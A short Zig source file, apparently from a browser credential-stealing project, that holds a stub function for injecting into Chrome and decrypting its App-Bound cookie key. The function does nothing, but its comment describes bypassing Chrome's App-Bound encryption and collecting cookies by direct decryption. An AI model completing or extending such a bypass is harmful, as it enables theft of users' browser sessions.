const std = @import("std");
const appbound = @import("appbound.zig");

pub fn injectAndDecryptKey(browser: appbound.BrowserType, out_key: *[32]u8) ?[]u8 {
    _ = browser;
    _ = out_key;
    // ponytail: App-Bound injection is a stub. The real implementation
    // requires Chrome Elevation Service protocol integration (RPC to
    // Google's COM server). This path collects App-Bound cookies via
    // the direct decryption route (appbound.zig) instead. Add when
    // Chrome v127+ App-Bound bypass is required.
    return null;
}
